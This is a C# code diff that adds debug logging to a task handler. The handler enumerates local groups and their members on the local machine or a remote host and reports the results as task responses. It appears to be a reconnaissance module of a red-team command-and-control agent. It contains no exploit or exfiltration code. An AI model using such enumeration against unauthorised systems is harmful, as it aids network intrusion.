@@ -68,16 +68,19 @@ namespace Workflow
         }
         public async Task Execute(ServerJob job)
         {
+            DebugLog.Log($"Executing {Name} [{job.task.id}]");
             //Dictionary<string, string> args = Misc.ConvertJsonStringToDict(job.task.parameters);
             GetLocalGroupArgs args = JsonSerializer.Deserialize<GetLocalGroupArgs>(job.task.parameters);
             TaskResponse rr = new TaskResponse();
             rr.task_id = job.task.id;
             if(args is null){
+                DebugLog.Log($"{Name} args null, returning [{job.task.id}]");
                 return;
             }
             
             if (!String.IsNullOrEmpty(args.group))
             { //Get Names of Groups
+                DebugLog.Log($"{Name} querying group '{args.group}' on '{args.hostname ?? "localhost"}' [{job.task.id}]");
                 if (!String.IsNullOrEmpty(args.hostname))
                 {
                     rr.user_output = String.Join(Environment.NewLine, GetLocalGroupMembers(args.hostname, args.group)); //Remote Host
@@ -89,6 +92,7 @@ namespace Workflow
             }
             else //Get members of Groups
             {
+                DebugLog.Log($"{Name} enumerating all groups on '{args.hostname ?? "localhost"}' [{job.task.id}]");
                 if (!String.IsNullOrEmpty(args.hostname))
                 {
                     rr.user_output = String.Join(Environment.NewLine, GetAllLocalGroups(args.hostname)); //Remote Host
@@ -101,6 +105,7 @@ namespace Workflow
 
             rr.completed = true;
             messageManager.AddTaskResponse(rr);
+            DebugLog.Log($"{Name} completed [{job.task.id}]");
         }
         public List<string> GetLocalGroupMembers(string? ServerName, string GroupName)
         {
